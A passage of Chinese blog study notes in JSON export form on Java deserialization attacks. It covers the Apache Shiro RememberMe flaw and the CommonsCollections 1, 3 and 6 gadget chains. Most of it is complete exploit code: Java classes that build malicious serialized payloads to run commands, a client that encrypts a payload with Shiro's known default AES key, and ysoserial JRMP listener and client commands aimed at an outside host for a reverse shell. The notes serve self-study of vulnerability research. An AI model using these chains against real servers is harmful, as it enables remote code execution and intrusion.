的类出现异常\n通过阅读两篇文档：\nhttps://blog.zsxsoft.com/post/35\nhttp://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\n第二篇本来是这个：http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91\n但是博客没了，所以找找找，在现在的第二篇的评论区发现了真正的原因\nJava原生的Class.forName的确不能加载数组，但是在shiro中是可以的，真实的原因是因为jdk和tomcat的classpath冲突，所以只能正常加载jdk内部的数组形式的类，而在tomcat中加载第三方就会导致找不到，只需添加tomcat启动设置，或者设置loader就行，原文没了，所以怎么设置也不知道\n这个问题老是出现，是真的烦\n构造不含数组的利用链：前面用CC6是含有Transformer数组的，所以利用不成功，现在需要找不含数组的利用链\nJRMP 利用链：同样是前面的第二篇文章里面提到了yso的JRMP 利用链\n使用URLDNS判断漏洞是否存在\njava -jar ysoserial-master-SNAPSHOT.jar URLDNS http:&#x2F;&#x2F;mydnsserver.orange.tw&#x2F; | python exp.py \n\n接着使用JRMP反弹shell\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 &#39;curl orange.tw&#39;\n\n# listen 一個 RMI server 走 JRMP 協議在 12345 port 上\njava -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;1.2.3.4:12345&#39;| python exp.py \n\n# 使用 JRMPClient 去連接剛剛 listen 的 server\n改造CC6：用 TemplatesImpl  加载字节码：\nTemplatesImpl obj &#x3D; new TemplatesImpl(); \n\nsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;&quot;...bytescode&quot;&#125;); \n\nsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\nsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); obj.newTransformer();  \n\n利用 InvokerTransformer 调用 TemplatesImpl#newTransformer 方法：  \nTransformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(obj), \n\nnew  InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;  \n\n但是这里也使用了数组，在这篇文中提到解决方法：\nhttps://www.anquanke.com/post/id/192619\nCC6里使用 TiedMapEntry 类，其构造参数有两个参数，前面为map，后者为key\nCC6时这个key是无所谓的，但是在TiedMapEntry类中给有个getValue方法，调用了\nmap.get(key)，当这个map是LazyMap是，get方法就是触发transform的点，这个key会被传进transform()\n而ConstantTransformer的作用是包裹一个对象，在执行回调时返回这个对象\n所以，这个key可以代替ConstantTransformer\n创建一个InvokerTransformer来调用newTransformer方法，先传入一个无害方法，后面再替换\nTransformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);  \n\n再修改TiedMapEntry的key为TemplatesImpl对象\nMap innerMap &#x3D; new HashMap(); \n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformer); \n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj); \n\nMap expMap &#x3D; new HashMap(); \n\nexpMap.put(tme, &quot;valuevalue&quot;); \n\nouterMap.clear();  \n\n使用outerMap.clear()的作用和前面outerMap.remove(“keykey”)一样\np牛封装好的代码：\npackage com.shiroattack;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollectionsShiro &#123;\n\t public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n\n\t    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t        TemplatesImpl obj &#x3D; new TemplatesImpl();\n\t        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        Transformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);\n\n\t        Map innerMap &#x3D; new HashMap();\n\t        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformer);\n\n\t        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj);\n\n\t        Map expMap &#x3D; new HashMap();\n\t        expMap.put(tme, &quot;valuevalue&quot;);\n\n\t        outerMap.clear();\n\t        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n\t        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t        &#x2F;&#x2F; 生成序列化字符串\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(expMap);\n\t        oos.close();\n\n\t        return barr.toByteArray();\n\t    &#125;\n\n&#125;\n\n\nClient.java生成payload的程序：\npackage com.shiroattack;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\npublic class Client &#123;\n\tpublic static void main(String []args) throws Exception &#123;\n\t\tClassPool pool &#x3D; ClassPool.getDefault();\n\t\tCtClass clazz &#x3D;\n\t\t\t\tpool.get(com.shiroattack.Evil.class.getName());\n\t\tbyte[] payloads &#x3D; new\n\t\t\t\tCommonsCollectionsShiro().getPayload(clazz.toBytecode());\n\t\tAesCipherService aes &#x3D; new AesCipherService();\n\t\tbyte[] key &#x3D;\n\t\t\t\tjava.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n\n\t\tByteSource ciphertext &#x3D; aes.encrypt(payloads, key);\n\t\tSystem.out.printf(ciphertext.toString());\n\t&#125;\n\n&#125;\n\n\n使用的javassit是字节码操纵的第三方库，作用是将恶意类生成字节码交给TemplatesImpl\n测试：生成payload，发送数据包\n\n报错了。。。。。\n检测发现是恶意类的原因，我使用的是前面BECL加载的恶意类，修改成com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类那个恶意类就没有问题\npackage com.TemplatesImplTest;\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\n&#x2F;&#x2F;必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类\npublic class HelloTemplateImplTest extends AbstractTranslet &#123;\n\tpublic void transform(DOM document, SerializationHandler[] handlers) \n\t\t\tthrows TransletException &#123;\n\t    &#125;\n\tpublic void transform(DOM document, DTMAxisIterator iterator, \n\t\t\tSerializationHandler handler) throws TransletException &#123;\n\t    &#125;\n\n\tpublic HelloTemplateImplTest () throws Exception  &#123;\n\t        super();\n\t        Runtime.getRuntime().exec(&quot;calc&quot;);\n\t    &#125;\n&#125;\n\n有点麻烦的是需要在tomcat窗口自己手动回车才会收到响应，不影响弹计算器，实战应该没有这个问题\n","slug":"Java反序列化5笔记","date":"2022-09-13T14:10:58.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"28bef31494b30752ba9f1f07e41299e2","title":"Java反序列化4笔记","content":"\n\n参考资料：p牛 Java安全漫谈 14   \nhttps://t.zsxq.com/05rjA2NJU\np牛 JavaThings\nhttps://github.com/phith0n/JavaThings\nCommon Collection3InvokerTransformerCC1使用transfoemers讲几个不同的transfeomer包裹，在使用chainedtansformer将前一个tansformer的输出作为后一个tansformer的输入，再将其作为hashmap对象的回调，当put新值时就会触发回调执行命令\n动态加载字节码，使用TemplatesImpl加载字节码（动态码笔记就不放在博客了）\nCC3初始，将CC1和TemplatesImpl结合\n代码在testclass里面，太长就不贴了\n漫谈中提到，在发布yso后，有人发布了过滤反序列化链的工具SerialKiller，在这个工具中将CC1的invokertransformer类添加为黑名单，所以我们将不能使用它\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类的构造方法中调用了 (TransformerImpl) templates.newTransformer()，免去使用InvokerTransformer手动调用newTransformer方法之一步\n这时个TransformerImpl对象，可以直接加载字节码\n但是，没有InvokerTransformer就无法使用TrAXFilter 类中的构造方法\n所以，需要 org.apache.commons.collections.functors.InstantiateTransformer  类，这个类也是一个实现了Transformer接口的类，作用是调用构造方法\n这样链路就完整了\n修改的Transformer调用链：\nTransformer[] transformers &#x3D; new Transformer[]&#123; \n\n\tnew ConstantTransformer(TrAXFilter.class), \n\n\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\n\tnew Object[] &#123; obj &#125;) \n&#125;;  \n\n将前面使用InvokerTransformer的Transformer替换即可\n注意：通前面的CC1一样，这也只是个demo，没有序列化，同时也只支持jdk8u71以下\n可以参考前面先让其序列化，在通过CC6文中介绍修改该链让其通杀\np牛改造的可以在jdk8u71以下执行\n再按照CC6修改以下，成功在大于jdk8u71时执行命令\n完整代码：package org.vulhub.sec;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;&#x2F;通用版本\npublic class CommonCollection3 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\tpublic static void main(String[] args) throws Exception &#123;\t \n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n&#x2F;&#x2F;\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n &#x2F;&#x2F;加载恶意类生成字节码，javassist第三方库            \n            ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplateImplTest.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t \n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123; \n\t\t\t\tnew ConstantTransformer(TrAXFilter.class), \n\t\t\t\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\t\t\t\tnew Object[] &#123; obj &#125;) \n\t\t&#125;; \n\t\tTransformer transformerChain &#x3D; new\n\t\t\t\tChainedTransformer(fakeTransformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t&#x2F;&#x2F;通用链，使用TiedMapEntry\n\t\tTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\t\t\n\t\tMap expMap &#x3D; new HashMap();\n\t\texpMap.put(tme, &quot;valuevalue&quot;);\n\t\touterMap.remove(&quot;keykey&quot;);\n\t\t\n\t\tField f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n        \n\t\t&#x2F;&#x2F;利用反射调用执行，这样不需要在之后输入map\n&#x2F;&#x2F;\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n&#x2F;&#x2F;\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n&#x2F;&#x2F;\t\tconstruct.setAccessible(true);\n        \n&#x2F;&#x2F;\t    InvocationHandler handler &#x3D; (InvocationHandler) construct.newInstance(Retention.class, outerMap);\n&#x2F;&#x2F;\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t \n\t\t&#x2F;&#x2F;序列化\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t&#x2F;&#x2F;写入数据\n\t\toos.writeObject(expMap);\n\t\toos.close();\n\t\t&#x2F;&#x2F;写入ObjectInputStream\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t&#x2F;&#x2F;反序列化\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n\n\n","slug":"Java反序列化4笔记","date":"2022-09-13T14:10:44.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"cc6f53e8dc634d13d7c94fb0decfd921","title":"Java反序列化3笔记","content":"\n\n参考资料：p牛 Java安全漫谈 12   Java反序列化6\nhttps://t.zsxq.com/05vVVfAeI\nCommon Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6\nAnnotationInvocationHandler类的readobject逻辑发生改变，无法在通过其调用LazyMap的get方法，而CC6链则发现一种新的可以调用LazyMap的get方法的类，通过TiedMapEntry类触发Lazy的get方法\norg.apache.commons.collections.keyvalue.TiedMapEntry在其getValue方法中直接返回map.get(key)，在此处调用了输入map的get方法\n\n同时该类里的hashCode方法又无条件的调用了getValue方法\n\n在前面的利用链里，hashmap的readobject方法调用了hash方法，而在hash方法里又调用了key的hashcode方法，所以这个利用链就完整了\n\n\n只需让hash方法的key为TiedMapEntry对象即可触发该类的hashcode方法\n将前面CC1链中获取的恶意LazyMap对象作为TiedMapEntry的map属性，实例化一个TiedMapEntry对象\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\n&#x2F;&#x2F;通用链，使用TiedMapEntry\n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n之后将其转化为hashmap对象的key\nMap expMap &#x3D; new HashMap();\n\nexpMap.put(tme, &quot;valuevalue&quot;);\n\n接着就能直接序列化和反序列化试试\n发现可以序列化但是无法弹出计算器\n原因在于反序列化时LazyMap的get方法进行了一个判断，当这个输入的key不存在这个map中时才会执行put操作，而调式发现这里输入的key为前面的keykey，这个keykey是存在于map中的，所以没有进入if判断\n还有一个原因是p牛的代码中没有直接将恶意回调放在Lazy里，而是先放一个不执行命令的回调，在put之后修改这个回调为恶意回调\n在将TiedMapEntry对象设置为hashmap的key时执行力put操作，而put方法里又调用了hash(key)，所以调式时是在这里就触发了利用链，在p牛的代码中，这时的回调并不是命令执行的回调，才会导致无法执行命令\n将其换成执行命令的回调是会导致命令执行，但是并不是我们需要的反序列化时的执行，而是直接在执行put操作时就执行了命令\n所以为了解决这个问题，需要在put之后将keykey值移除，在修改回调为恶意回调\n\n为了明显查看，所以直接在前面就将回调设置为执行命令的回调，调式发现弹出来两次计算机，一次是在put时就弹出，一次是在readobject时弹出，说明前面的分析没有问题\n完整代码：package org.vulhub.sec;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollections6 &#123;\n    public static void main(String[] args) throws Exception &#123;\n    \t&#x2F;&#x2F;防止本地调式在put时触发命令执行\n        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n        Transformer[] transformers &#x3D; new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,\n                        new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n                        new String[] &#123; &quot;calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n        &#125;;\n        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\n        &#x2F;&#x2F; 不再使用原CommonsCollections6中的HashSet，直接使用HashMap\n        Map innerMap &#x3D; new HashMap();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n        &#x2F;&#x2F;通用链，使用TiedMapEntry\n        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n        Map expMap &#x3D; new HashMap();\n        &#x2F;&#x2F;会触发一次利用链\n        expMap.put(tme, &quot;valuevalue&quot;);\n        &#x2F;&#x2F;移除掉以达到进入if判断，执行命令\n        outerMap.remove(&quot;keykey&quot;);\n\n        Field f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n\n        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n        &#x2F;&#x2F; 生成序列化字符串\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(expMap);\n        oos.close();\n\n        &#x2F;&#x2F; 本地测试触发\n        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n&#125;\n\n","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"40de76659604bae52b4863ba88be567d","title":"Java反序列化2笔记","content":"参考资料：p牛 Java安全漫谈 9 10 11反序列化3 4 5：\nhttps://t.zsxq.com/05MzN7miq\nhttps://t.zsxq.com/05AAAEYVN\nhttps://t.zsxq.com/05VVRfAea\n前面了解了反序列化利用基础，和URLDNS利用链\n接下来学习，Common Collections 1 利用链\nCommon Collections 1环境：eclipse，下载3.1版本的Common Collections jar文件\nhttps://nowjava.com/jar/detail/m02261225/commons-collections-3.1.jar.html\n在build path的设置中添加该jar文件，之后选用并且应用它\n同时为了在eclipse中调试方便，还需要下载Common Collections sources jar包同时导入\n在修改打开源代码路径为Common Collections sources jar  就能够查看源代码了\n根据漫谈中的简化版cc1利用链demo代码，运行后能够成功弹出计算器\n原理：利用common collection 中的transfromer构造利用链\nTransformedMap用于修饰map，被修饰的map在使用put添加新元素时会执行一个回调\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);  \n\n对innermap进行修饰，设置一个处理新元素key的回调和一个处理\n新元素value的回调，回调指的是实现transformer接口的类，之后返回修饰好的outerMap\nTransformer是一个接口，接口里面只有一个待实现方法\npublic interface Transformer &#123;\n\n\tpublic Object transform(Object input);\n\n&#125;  \n\nTransformedMap在转换Map新元素调用tansform方法，过程类似于调用回调函数，这个函数的参数是原始对象。\nConstantTransformer是实现Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，在tansform方法将对象在返回\n public ConstantTransformer(Object constantToReturn) &#123;\n\n\t super(); \n     iConstant &#x3D; constantToReturn; \n\n&#125; \n\npublic Object transform(Object input) &#123;\n\n \treturn iConstant; \n\n&#125;  \n\n 所以他的作⽤其实就是包装任意⼀个对象，在执行回调时返回这个对象，进而方便后续操作。  \nInvokerTransformer是一个实现Transformer接口的类，可以用来执行任意方法，是反序列化能执行任意代码的关键\n实例化时需要传入三个参数，第一个是待执行的方法名，第二个是这个函数的参数列表的参数类型，第三个是传给这个函数的参数列表\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; \n\n\tsuper();\n\n\tiMethodName &#x3D; methodName; \n\n\tiParamTypes &#x3D; paramTypes; iArgs &#x3D; args; \n\n&#125;  \n\n后面回调Transform方法，执行input对象的iMethodName方法\npublic Object transform(Object input) &#123; \n\n\tif (input &#x3D;&#x3D; null) &#123; \n\n\t\treturn null; \n\n\t&#125;\n\n \ttry &#123; \n\n\t\tClass cls &#x3D; input.getClass(); \n\n\t\tMethod method &#x3D; cls.getMethod(iMethodName, iParamTypes); \n\n\t\treturn method.invoke(input, iArgs); \n\n\t&#125; catch (NoSuchMethodException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; does not exist&quot;);\n\n\t &#125; catch (IllegalAccessException ex) &#123;  \n\n \t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; cannot be accessed&quot;); \n\n\t&#125; catch (InvocationTargetException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t \t+ \tinput.getClass() + &quot;&#39; threw an exception&quot;, ex); \n\n\t&#125; \n\n&#125;  \n\n\n\nChainedTransformer是一个实现Transformer接口的类，作用是将内部的Transformer串在一起。将前面一个回调的执行结果当作后一个回调的参数传入\npublic ChainedTransformer(Transformer[] transformers) &#123; \n\n\tsuper(); \n\n\tiTransformers &#x3D; transformers; \n\n&#125; \n\npublic Object transform(Object object) &#123; \n\n\tfor (int i &#x3D; 0; i &lt; iTransformers.length; i++) &#123; \n\n\t\tobject &#x3D; iTransformers[i].transform(object); \n\n\t&#125; \n    return object;\n\n &#125;  \n\n\n\nTransformedMap使用ChainedTransformer将ConstantTransformer和InvokerTransformer串联起来，其中ConstantTransformer获取当前环境的Runtime对象，InvokerTransformer执行Runtime对象的exec方法，参数是当前计算机程序的位置\n将其作为innermap的TransformerMap修饰\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\n这个修饰无论是当作key修饰还是value修饰，还是两个修饰都是，都只会触发一次弹出一次计算器\n前面说过，当这个修饰的map添加新元素时就会触发回调\nouterMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n所以添加一个新元素，就会执行回调，获取Runtime对象，在执行exec方法调用计算器\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CommonCollections1 &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t\t Transformer[] transformers &#x3D; new Transformer[]&#123;\n\t\t\t\t new ConstantTransformer(Runtime.getRuntime()),\n\t\t\t\t new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\t new Object[]\n\t\t\t\t\t\t\t\t &#123;&quot;C:\\\\Windows\\\\SysWOW64\\\\calc.exe&quot;&#125;),\n\t\t &#125;;\n\t\t Transformer transformerChain &#x3D; new\n\t\t\t\t \tChainedTransformer(transformers);\n\t\t Map innerMap &#x3D; new HashMap();\n\t\t Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\t\t outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n\n\t &#125;\n\t\n&#125;\n\n\n\n\n反序列化利用环境：小于jdk 8u71\n前面的demo只能在本地运行测试，而要真正利用则需要将其生成序列化数据\ndemo的核心是利用put操作，让其执行回调，实际反序列化时需要找到一个类其readObject方法里又类似于写入的操作\nsun.reflect.annotation.AnnotationInvocationHandler这个类的readObject方法，会遍历反序列化得到的map的所有元素，并将其依次设置值，在执行这个操作时，就会触发回调\n因为该类是jdk内部的类，不能直接实例化，所以通过反射调用它\nClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\nConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\nconstruct.setAccessible(true);\n\nObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\nAnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是参数就是前面构造的Map。  \n在反序列化测试时发现，Runtime报错，原因是Runtime类没有实现 java.io.Serializable  接口，所以需要将其改为通过反射调用，这个得到的是一个class对象，这个java.lang.class实现了java.io.Serializable接口就能正常序列化。\nTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, \t\t\t\t\t\t\t\t\t\t  new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, \n                                       new Object[] &#123; null, new Object[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\n\t\t\t\tnew String[] &#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\n&#125;;\n\n再次反序列化输出了反序列化数据，但是不能正常弹计算器\n这是由于AnnotationInvocationHandler类的readObject方法中有个if判断，只有当var7不为空时才会执行setValue操作，才能正常触发回调\n条件：\n\n sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X  \n 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素  \n\n所以前面使用了Retention.class，它有一个value方法，所以在innermap时，需要传入一个key为value的元素\ninner.put(&quot;value&quot;,&quot;xxx&quot;);\n\n这样就保证执行了setValue操作\n再运行就能成功弹出计算器，在小于jdk8u71的情况下。在大于等于8u71时无法弹出。\n大于8u71时无法弹出是因为修改了这个类的readObject方法，反序列化后得到的map不直接使用，而是新建一个LinkedHashMap对象，将原来的键值添加进去，后续对map的操作是基于这个LinkedHashMap对象，而这个对象并没有以前map的修饰，所以在对LinkedHashMap对象进行set和put时，也就无法触发原来map上的回调。\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonCollections1next &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew 